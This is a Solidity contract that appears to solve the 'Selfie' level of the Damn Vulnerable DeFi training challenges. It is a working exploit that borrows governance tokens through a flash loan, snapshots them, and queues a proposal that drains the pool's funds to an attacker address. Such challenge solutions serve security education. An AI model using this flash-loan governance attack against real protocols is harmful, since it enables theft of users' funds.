// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableTokenSnapshot.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
}

contract SelfieAttack {
    IPool immutable public pool;
    IGovernance immutable public governance;
    address immutable public attacker;

    constructor(
        IPool _pool, 
        IGovernance _governance,
        address _attacker
     ) {
        pool = _pool;
        governance = _governance;
        attacker = _attacker;
    }

    function receiveTokens(address token, uint256 borrowAmount) external {
        // First snapshot balances to make sure this contract has enough balance in the snapshot to send a proposal.
        DamnValuableTokenSnapshot(token).snapshot();

        // Now propose new governance action to drain all of its funds and send to the attacker.
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
        );
        governance.queueAction(address(pool), data, 0);

        // Simply pay back flash loan now that proposal is enqueued.
        DamnValuableTokenSnapshot(token).transfer(msg.sender, borrowAmount);
    }

    function drainFunds(uint256 borrowAmount) external {
        // Flash loan will trigger receiveTokens which will enqueue a malicious proposal.
        pool.flashLoan(borrowAmount);
    }
}
